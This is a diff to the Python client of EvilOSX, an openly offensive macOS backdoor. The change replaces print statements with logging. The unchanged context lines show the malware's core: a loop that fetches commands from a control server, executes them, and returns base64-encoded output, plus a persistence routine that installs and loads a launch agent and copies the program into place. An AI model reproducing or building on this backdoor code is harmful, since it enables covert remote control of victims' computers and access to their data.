@@ -19,6 +19,7 @@ import base64
 from StringIO import StringIO
 import sys
 import ssl
+import logging
 
 SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 1337
@@ -30,6 +31,10 @@ IDLE_TIME = 60  # Time in seconds after which the client will become idle.
 
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
+
+# Logging
+logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
+log = logging.getLogger(__name__)
 
 
 def receive_command():
@@ -129,7 +134,7 @@ def run_command(command, cleanup=True, kill_on_timeout=True):
             os.chdir(os.path.expanduser(command[3:]))
             return MESSAGE_INFO + "Directory changed."
         except Exception as ex:
-            print MESSAGE_ATTENTION + str(ex)
+            log.error(str(ex))
             return str(ex)
     else:
         try:
@@ -155,7 +160,7 @@ def run_command(command, cleanup=True, kill_on_timeout=True):
                 if timer:
                     timer.cancel()
         except Exception as ex:
-            print MESSAGE_ATTENTION + str(ex)
+            log.error(str(ex))
             return str(ex)
 
 
@@ -203,7 +208,7 @@ def setup_persistence():
     run_command("mkdir -p {0}".format(get_launch_agent_directory()))
 
     # Create launch agent
-    print MESSAGE_INFO + "Creating launch agent..."
+    log.debug("Creating launch agent...")
 
     launch_agent_create = """\
         <?xml version="1.0" encoding="UTF-8"?>
@@ -228,7 +233,7 @@ def setup_persistence():
         open_file.write(launch_agent_create)
 
     # Move EvilOSX
-    print MESSAGE_INFO + "Moving EvilOSX..."
+    log.debug("Moving EvilOSX...")
 
     if DEVELOPMENT:
         with open(__file__, "rb") as input_file, open(get_program_file(), "wb") as output_file:
@@ -238,21 +243,21 @@ def setup_persistence():
     os.chmod(get_program_file(), 0777)
 
     # Load launch agent
-    print MESSAGE_INFO + "Loading launch agent..."
+    log.debug("Loading launch agent...")
 
     output = run_command("launchctl load -w {0}".format(get_launch_agent_file()))
 
     if output == "":
         if run_command("launchctl list | grep -w {0}".format(LAUNCH_AGENT_NAME)):
-            print MESSAGE_INFO + "Done!"
+            log.debug("Done!")
             sys.exit(0)
         else:
-            print MESSAGE_ATTENTION + "Failed to load launch agent."
+            log.error("Failed to load launch agent.")
     elif "already loaded" in output.lower():
-        print MESSAGE_ATTENTION + "EvilOSX is already loaded."
+        log.error("EvilOSX is already loaded.")
         sys.exit(0)
     else:
-        print MESSAGE_ATTENTION + "Unexpected output: " + output
+        log.error("Unexpected output: %s", output)
         pass
 
 
@@ -308,7 +313,7 @@ def main():
 
     while True:
         try:
-            print MESSAGE_INFO + "Receiving command..."
+            log.info("Receiving command...")
             command_type, module_name, command = receive_command()
 
             if command:
@@ -317,38 +322,38 @@ def main():
 
                 if command_type == "COMMAND":
                     # Run a system command.
-                    print MESSAGE_INFO + "Running command: " + command
+                    log.info("Running command: %s", command)
 
                     send_response("{0}||{1}".format(
                         "COMMAND", base64.b64encode(run_command(command, cleanup=False))
                     ))
                 elif command_type == "MODULE":
                     # Run a module.
-                    print MESSAGE_INFO + "Running module..."
+                    log.info("Running module: %s", module_name)
 
                     send_response(run_module(command, module_name))
             else:
-                print MESSAGE_INFO + "No command received."
+                log.info("No command received.")
 
                 if idle:
                     time.sleep(30)
                 elif (time.time() - last_active) > IDLE_TIME:
-                    print MESSAGE_INFO + "The last command was a while ago, switching to idle..."
+                    log.info("The last command was a while ago, switching to idle...")
                     idle = True
                 else:
                     time.sleep(COMMAND_INTERVAL)
         except Exception as ex:
             if "Connection refused" in str(ex):
                 # The server is offline.
-                print MESSAGE_ATTENTION + "Failed to connect to the server."
+                log.warn("Failed to connect to the server.")
                 time.sleep(5)
             elif "certificate" in str(ex):
                 # Invalid certificate authority.
-                print MESSAGE_ATTENTION + "Error: {0}".format(str(ex))
-                print MESSAGE_ATTENTION + "Invalid certificate authority, removing..."
+                log.error("Error: %s", str(ex))
+                log.error("Invalid certificate authority, removing...")
                 os.remove(get_program_directory() + "/server_cert.pem")
             else:
-                print MESSAGE_ATTENTION + traceback.format_exc()
+                log.error(traceback.format_exc())
                 time.sleep(5)
 
 
